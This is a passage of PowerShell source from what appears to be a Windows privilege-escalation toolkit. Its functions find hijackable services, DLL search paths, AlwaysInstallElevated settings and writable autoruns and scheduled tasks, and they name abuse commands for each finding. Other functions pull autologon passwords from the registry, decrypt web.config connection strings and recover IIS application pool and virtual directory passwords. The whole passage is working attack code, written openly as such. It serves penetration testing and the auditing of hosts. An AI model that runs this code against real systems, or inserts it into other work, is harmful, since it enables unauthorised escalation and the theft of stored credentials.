                    $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                    $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                    $Out
                }
            }
        }
    }
    function Get-ModifiableServiceFile {
    <#
        .SYNOPSIS
    
            Enumerates all services and returns vulnerable service files.
    
        .DESCRIPTION
    
            Enumerates all services by querying the WMI win32_service class. For each service,
            it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine
            if the current user has rights to modify the service binary itself or any associated
            arguments. If the associated binary (or any configuration files) can be overwritten,
            privileges may be able to be escalated.
    
        .EXAMPLE
    
            PS C:\> Get-ModifiableServiceFile
    
            Get a set of potentially exploitable service binares/config files.
    #>
        [CmdletBinding()] param()
    
        Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
    
            $ServiceName = $_.name
            $ServicePath = $_.pathname
            $ServiceStartName = $_.startname
    
            $ServicePath | Get-ModifiablePath | ForEach-Object {
    
                $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
    
                if($ServiceRestart) {
                    $CanRestart = $True
                }
                else {
                    $CanRestart = $False
                }
    
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'Path' $ServicePath
                $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
                $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $($_.Permissions -join ", ")
                $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
                $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
                $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
                $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                $Out
            }
        }
    }
    
    
    function Get-ModifiableService {
    <#
        .SYNOPSIS
    
            Enumerates all services and returns services for which the current user can modify the binPath.
    
        .DESCRIPTION
    
            Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if
            the current user has rights to change the service configuration.
    
        .EXAMPLE
    
            PS C:\> Get-ModifiableService
    
            Get a set of potentially exploitable services.
    #>
        [CmdletBinding()] param()
    
        Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
    
            $ServiceDetails = $_ | Get-ServiceDetail
    
            $ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
    
            if($ServiceRestart) {
                $CanRestart = $True
            }
            else {
                $CanRestart = $False
            }
    
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
            $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
            $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
            $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
    
    
    function Get-ServiceDetail {
    <#
        .SYNOPSIS
    
            Returns detailed information about a specified service by querying the
            WMI win32_service class for the specified service name.
    
        .DESCRIPTION
    
            Takes an array of one or more service Names or ServiceProcess.ServiceController objedts on
            the pipeline object returned by Get-Service, extracts out the service name, queries the
            WMI win32_service class for the specified service for details like binPath, and outputs
            everything.
    
        .PARAMETER Name
    
            An array of one or more service names to query information for.
    
        .EXAMPLE
    
            PS C:\> Get-ServiceDetail -Name VulnSVC
    
            Gets detailed information about the 'VulnSVC' service.
    
        .EXAMPLE
    
            PS C:\> Get-Service VulnSVC | Get-ServiceDetail
    
            Gets detailed information about the 'VulnSVC' service.
    #>
    
        param (
            [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
            [Alias('ServiceName')]
            [String[]]
            [ValidateNotNullOrEmpty()]
            $Name
        )
    
        PROCESS {
    
            ForEach($IndividualService in $Name) {
    
                $TargetService = Get-Service -Name $IndividualService
    
                Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                    try {
                        $_
                    }
                    catch{
                        Write-Verbose "Error: $_"
                        $null
                    }
                }
            }
        }
    }
    
    
    ########################################################
    #
    # DLL Hijacking
    #
    ########################################################
    
    function Find-ProcessDLLHijack {
    <#
        .SYNOPSIS
    
            Finds all DLL hijack locations for currently running processes.
    
            Author: @harmj0y
            License: BSD 3-Clause
    
        .DESCRIPTION
    
            Enumerates all currently running processes with Get-Process (or accepts an
            input process object from Get-Process) and enumerates the loaded modules for each.
            All loaded module name exists outside of the process binary base path, as those
            are DLL load-order hijack candidates.
    
        .PARAMETER Name
    
            The name of a process to enumerate for possible DLL path hijack opportunities.
    
        .PARAMETER ExcludeWindows
    
            Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*
    
        .PARAMETER ExcludeProgramFiles
    
            Exclude paths from C:\Program Files\* and C:\Program Files (x86)\*
    
        .PARAMETER ExcludeOwned
    
            Exclude processes the current user owns.
    
        .EXAMPLE
    
            PS C:\> Find-ProcessDLLHijack
    
            Finds possible hijackable DLL locations for all processes.
    
        .EXAMPLE
    
            PS C:\> Get-Process VulnProcess | Find-ProcessDLLHijack
    
            Finds possible hijackable DLL locations for the 'VulnProcess' processes.
    
        .EXAMPLE
    
            PS C:\> Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles
    
            Finds possible hijackable DLL locations not in C:\Windows\* and
            not in C:\Program Files\* or C:\Program Files (x86)\*
    
        .EXAMPLE
    
            PS C:\> Find-ProcessDLLHijack -ExcludeOwned
    
            Finds possible hijackable DLL location for processes not owned by the
            current user.
    
        .LINK
    
            https://www.mandiant.com/blog/malware-persistence-windows-registry/
    #>
    
        [CmdletBinding()]
        Param(
            [Parameter(Position=0, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
            [Alias('ProcessName')]
            [String[]]
            $Name = $(Get-Process | Select-Object -Expand Name),
    
            [Switch]
            $ExcludeWindows,
    
            [Switch]
            $ExcludeProgramFiles,
    
            [Switch]
            $ExcludeOwned
        )
    
        BEGIN {
            # the known DLL cache to exclude from our findings
            #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
            $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
            $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName) }) | Where-Object { $_.EndsWith(".dll") }
            $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    
            # get the owners for all processes
            $Owners = @{}
            Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
        }
    
        PROCESS {
    
            ForEach ($ProcessName in $Name) {
    
                $TargetProcess = Get-Process -Name $ProcessName
    
                if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {
    
                    try {
                        $BasePath = $TargetProcess.Path | Split-Path -Parent
    
                        $LoadedModules = $TargetProcess.Modules
    
                        $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]
    
                        ForEach ($Module in $LoadedModules){
    
                            $ModulePath = "$BasePath\$($Module.ModuleName)"
    
                            # if the module path doesn't exist in the process base path folder
                            if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
    
                                $Exclude = $False
    
                                if($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                    $Exclude = $True
                                }
    
                                if($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                    $Exclude = $True
                                }
    
                                if($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                    $Exclude = $True
                                }
    
                                # output the process name and hijackable path if exclusion wasn't marked
                                if (-not $Exclude){
                                    $Out = New-Object PSObject
                                    $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                    $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                    $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                    $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                    $Out
                                }
                            }
                        }
                    }
                    catch {
                        Write-Verbose "Error: $_"
                    }
                }
            }
        }
    }
    
    
    function Find-PathDLLHijack {
    <#
        .SYNOPSIS
    
            Finds all directories in the system %PATH% that are modifiable by the current user.
    
            Author: @harmj0y
            License: BSD 3-Clause
    
        .DESCRIPTION
    
            Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
            to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
            written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
            order loading.
    
        .EXAMPLE
    
            PS C:\> Find-PathDLLHijack
    
            Finds all %PATH% .DLL hijacking opportunities.
    
        .LINK
    
            http://www.greyhathacker.net/?p=738
    #>
    
        [CmdletBinding()]
        Param()
    
        # use -LiteralPaths so the spaces in %PATH% folders are not tokenized
        Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
            $TargetPath = $_
    
            $ModifiablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
            ForEach($ModifiablePath in $ModifiablePaths) {
                if($ModifiablePath.ModifiablePath -ne $Null) {
                    $ModifiablePath | Add-Member Noteproperty '%PATH%' $_
                    $ModifiablePath.Permissions = $ModifiablePath.permissions -join ', '
                    $ModifiablePath
                }
            }
        }
    }
    
    
    ########################################################
    #
    # Registry Checks
    #
    ########################################################
    
    function Get-RegistryAlwaysInstallElevated {
    <#
        .SYNOPSIS
    
            Checks if any of the AlwaysInstallElevated registry keys are set.
    
        .DESCRIPTION
    
            Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
            or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
            are set, $False otherwise. If one of these keys are set, then all .MSI files run with
            elevated permissions, regardless of current user permissions.
    
        .EXAMPLE
    
            PS C:\> Get-RegistryAlwaysInstallElevated
    
            Returns $True if any of the AlwaysInstallElevated registry keys are set.
    #>
    
        [CmdletBinding()]
        Param()
    
        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    
        if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {
    
            $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"
    
            if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
    
                $HKCUval = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
                Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"
    
                if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                    Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                    $True
                }
                else{
                    Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                    $False
                }
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
            $False
        }
    
        $ErrorActionPreference = $OrigError
    }
    
    
    function Get-RegistryAutoLogon {
    <#
        .SYNOPSIS
    
            Finds any autologon credentials left in the registry.
    
        .DESCRIPTION
    
            Checks if any autologon accounts/credentials are set in a number of registry locations.
            If they are, the credentials are extracted and returned as a custom PSObject.
    
        .EXAMPLE
    
            PS C:\> Get-RegistryAutoLogon
    
            Finds any autologon credentials left in the registry.
    
        .LINK
    
            https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
    #>
    
        [CmdletBinding()]
        Param()
    
        $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    
        Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"
    
        if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
    
            $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
            $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
            $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
            $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
            $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
            $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
    
            if ($DefaultUserName -or $AltDefaultUserName) {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
                $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
                $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
                $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
                $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
                $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
                $Out
            }
        }
    }
    
    function Get-ModifiableRegistryAutoRun {
    <#
        .SYNOPSIS
    
            Returns any elevated system autoruns in which the current user can
            modify part of the path string.
    
        .DESCRIPTION
    
            Enumerates a number of autorun specifications in HKLM and filters any
            autoruns through Get-ModifiablePath, returning any file/config locations
            in the found path strings that the current user can modify.
    
        .EXAMPLE
    
            PS C:\> Get-ModifiableRegistryAutoRun
    
            Return vulneable autorun binaries (or associated configs).
    #>
    
        [CmdletBinding()]
        Param()
    
        $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                                "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                                "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                                "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                                "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                                "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                                "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                            )
    
        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    
        $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
    
            $Keys = Get-Item -Path $_
            $ParentPath = $_
    
            ForEach ($Name in $Keys.GetValueNames()) {
    
                $Path = $($Keys.GetValue($Name))
    
                $Path | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                    $Out | Add-Member Noteproperty 'Path' $Path
                    $Out | Add-Member Noteproperty 'ModifiableFile' $_
                    $Out
                }
            }
        }
    
        $ErrorActionPreference = $OrigError
    }
    
    
    ########################################################
    #
    # Miscellaneous checks
    #
    ########################################################
    
    function Get-ModifiableScheduledTaskFile {
    <#
        .SYNOPSIS
    
            Returns scheduled tasks where the current user can modify any file
            in the associated task action string.
    
        .DESCRIPTION
    
            Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
            and parses the XML specification for each task, extracting the command triggers.
            Each trigger string is filtered through Get-ModifiablePath, returning any file/config
            locations in the found path strings that the current user can modify.
    
        .EXAMPLE
    
            PS C:\> Get-ModifiableScheduledTaskFile
    
            Return scheduled tasks with modifiable command strings.
    #>
    
        [CmdletBinding()]
        Param()
    
        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    
        $Path = "$($ENV:windir)\System32\Tasks"
    
        # recursively enumerate all schtask .xmls
        Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
            try {
                $TaskName = $_.Name
                $TaskXML = [xml] (Get-Content $_.FullName)
                if($TaskXML.Task.Triggers) {
    
                    $TaskTrigger = $TaskXML.Task.Triggers.OuterXML
    
                    # check schtask command
                    $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'TaskName' $TaskName
                        $Out | Add-Member Noteproperty 'TaskFilePath' $_
                        $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                        $Out
                    }
    
                    # check schtask arguments
                    $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'TaskName' $TaskName
                        $Out | Add-Member Noteproperty 'TaskFilePath' $_
                        $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "Error: $_"
            }
        }
    
        $ErrorActionPreference = $OrigError
    }
    
    
    function Get-UnattendedInstallFile {
    <#
        .SYNOPSIS
    
            Checks several locations for remaining unattended installation files,
            which may have deployment credentials.
    
        .EXAMPLE
    
            PS C:\> Get-UnattendedInstallFile
    
            Finds any remaining unattended installation files.
    
        .LINK
    
            http://www.fuzzysecurity.com/tutorials/16.html
    #>
    
        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    
        $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                                "c:\sysprep\sysprep.inf",
                                "c:\sysprep.inf",
                                (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                                (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                                (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                                (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                                (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                                (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                            )
    
        # test the existence of each path and return anything found
        $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'UnattendPath' $_
            $Out
        }
    
        $ErrorActionPreference = $OrigError
    }
    
    
    function Get-WebConfig {
    <#
        .SYNOPSIS
    
            This script will recover cleartext and encrypted connection strings from all web.config
            files on the system.  Also, it will decrypt them if needed.
    
            Author: Scott Sutherland - 2014, NetSPI
            Author: Antti Rantasaari - 2014, NetSPI
    
        .DESCRIPTION
    
            This script will identify all of the web.config files on the system and recover the
            connection strings used to support authentication to backend databases.  If needed, the
            script will also decrypt the connection strings on the fly.  The output supports the
            pipeline which can be used to convert all of the results into a pretty table by piping
            to format-table.
    
        .EXAMPLE
    
            Return a list of cleartext and decrypted connect strings from web.config files.
    
            PS C:\> Get-WebConfig
            user   : s1admin
            pass   : s1password
            dbserv : 192.168.1.103\server1
            vdir   : C:\test2
            path   : C:\test2\web.config
            encr   : No
    
            user   : s1user
            pass   : s1password
            dbserv : 192.168.1.103\server1
            vdir   : C:\inetpub\wwwroot
            path   : C:\inetpub\wwwroot\web.config
            encr   : Yes
    
        .EXAMPLE
    
            Return a list of clear text and decrypted connect strings from web.config files.
    
            PS C:\>get-webconfig | Format-Table -Autosize
    
            user    pass       dbserv                vdir               path                          encr
            ----    ----       ------                ----               ----                          ----
            s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
            s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
            s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
            s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
            s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 
    
         .LINK
    
            https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
            http://www.netspi.com
            https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
            http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
            http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
    
         .NOTES
    
            Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
            for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
    #>
    
        [CmdletBinding()]
        Param()
    
        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    
        # Check if appcmd.exe exists
        if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
    
            # Create data table to house results
            $DataTable = New-Object System.Data.DataTable
    
            # Create and name columns in the data table
            $Null = $DataTable.Columns.Add("user")
            $Null = $DataTable.Columns.Add("pass")
            $Null = $DataTable.Columns.Add("dbserv")
            $Null = $DataTable.Columns.Add("vdir")
            $Null = $DataTable.Columns.Add("path")
            $Null = $DataTable.Columns.Add("encr")
    
            # Get list of virtual directories in IIS
            C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
            ForEach-Object {
    
                $CurrentVdir = $_
    
                # Converts CMD style env vars (%) to powershell env vars (env)
                if ($_ -like "*%*") {
                    $EnvarName = "`$Env:"+$_.split("%")[1]
                    $EnvarValue = Invoke-Expression $EnvarName
                    $RestofPath = $_.split("%")[2]
                    $CurrentVdir  = $EnvarValue+$RestofPath
                }
    
                # Search for web.config files in each virtual directory
                $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
    
                    # Set web.config path
                    $CurrentPath = $_.fullname
    
                    # Read the data from the web.config xml file
                    [xml]$ConfigFile = Get-Content $_.fullname
    
                    # Check if the connectionStrings are encrypted
                    if ($ConfigFile.configuration.connectionStrings.add) {
    
                        # Foreach connection string add to data table
                        $ConfigFile.configuration.connectionStrings.add| 
                        ForEach-Object {
    
                            [String]$MyConString = $_.connectionString
                            if($MyConString -like "*password*") {
                                $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                $ConfVdir = $CurrentVdir
                                $ConfPath = $CurrentPath
                                $ConfEnc = "No"
                                $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                            }
                        }
                    }
                    else {
    
                        # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                        $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1
    
                        # Check if aspnet_regiis.exe exists
                        if (Test-Path  ($AspnetRegiisPath.FullName)) {
    
                            # Setup path for temp web.config to the current user's temp dir
                            $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"
    
                            # Remove existing temp web.config
                            if (Test-Path  ($WebConfigPath)) {
                                Remove-Item $WebConfigPath
                            }
    
                            # Copy web.config from vdir to user temp for decryption
                            Copy-Item $CurrentPath $WebConfigPath
    
                            # Decrypt web.config in user temp
                            $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                            $Null = Invoke-Expression $AspnetRegiisCmd
    
                            # Read the data from the web.config in temp
                            [xml]$TMPConfigFile = Get-Content $WebConfigPath
    
                            # Check if the connectionStrings are still encrypted
                            if ($TMPConfigFile.configuration.connectionStrings.add) {
    
                                # Foreach connection string add to data table
                                $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {
    
                                    [String]$MyConString = $_.connectionString
                                    if($MyConString -like "*password*") {
                                        $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                        $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                        $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                        $ConfVdir = $CurrentVdir
                                        $ConfPath = $CurrentPath
                                        $ConfEnc = 'Yes'
                                        $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                    }
                                }
    
                            }
                            else {
                                Write-Verbose "Decryption of $CurrentPath failed."
                                $False
                            }
                        }
                        else {
                            Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                            $False
                        }
                    }
                }
            }
    
            # Check if any connection strings were found
            if( $DataTable.rows.Count -gt 0 ) {
                # Display results in list view that can feed into the pipeline
                $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
            }
            else {
                Write-Verbose 'No connection strings found.'
                $False
            }
        }
        else {
            Write-Verbose 'Appcmd.exe does not exist in the default location.'
            $False
        }
    
        $ErrorActionPreference = $OrigError
    }
    
    function Get-WebConfigFilePermissions {
    
    Get-ChildItem -path C:\inetpub\ -Recurse -ErrorAction SilentlyContinue -include web.config | Get-EffectiveAccess | Select-Object IdentityReference,DisplayName,EffectiveAccess | Format-Table -auto | Out-String -width 300
    
    }
    
    function Get-ApplicationHost {
     <#
        .SYNOPSIS
    
            This script will recover encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
    
        .DESCRIPTION
    
            This script will decrypt and recover application pool and virtual directory passwords
            from the applicationHost.config file on the system.  The output supports the
            pipeline which can be used to convert all of the results into a pretty table by piping
            to format-table.
    
        .EXAMPLE
    
            Return application pool and virtual directory passwords from the applicationHost.config on the system.
    
            PS C:\> Get-ApplicationHost
            user    : PoolUser1
            pass    : PoolParty1!
            type    : Application Pool
            vdir    : NA
            apppool : ApplicationPool1
            user    : PoolUser2
            pass    : PoolParty2!
            type    : Application Pool
            vdir    : NA
            apppool : ApplicationPool2
            user    : VdirUser1
            pass    : VdirPassword1!
            type    : Virtual Directory
            vdir    : site1/vdir1/
            apppool : NA
            user    : VdirUser2
            pass    : VdirPassword2!
            type    : Virtual Directory
            vdir    : site2/
            apppool : NA
    
        .EXAMPLE
    
            Return a list of cleartext and decrypted connect strings from web.config files.
    
            PS C:\> Get-ApplicationHost | Format-Table -Autosize
    
            user          pass               type              vdir         apppool
            ----          ----               ----              ----         -------
            PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
            PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
            VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
            VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA
    
        .LINK
    
            https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
            http://www.netspi.com
            http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
            http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
    
        .NOTES
    
            Author: Scott Sutherland - 2014, NetSPI
            Version: Get-ApplicationHost v1.0
            Comments: Should work on IIS 6 and Above
    #>
    
        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    
        # Check if appcmd.exe exists
        if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
            # Create data table to house results
            $DataTable = New-Object System.Data.DataTable
    
            # Create and name columns in the data table
            $Null = $DataTable.Columns.Add("user")
            $Null = $DataTable.Columns.Add("pass")
            $Null = $DataTable.Columns.Add("type")
            $Null = $DataTable.Columns.Add("vdir")
            $Null = $DataTable.Columns.Add("apppool")
    
            # Get list of application pools
            Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
    
                # Get application pool name
                $PoolName = $_
    
                # Get username
                $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
                $PoolUser = Invoke-Expression $PoolUserCmd
    
                # Get password
                $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
                $PoolPassword = Invoke-Expression $PoolPasswordCmd
    
                # Check if credentials exists
                if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                    # Add credentials to database
                    $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
                }
            }
    
            # Get list of virtual directories
            Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
    
                # Get Virtual Directory Name
                $VdirName = $_
    
                # Get username
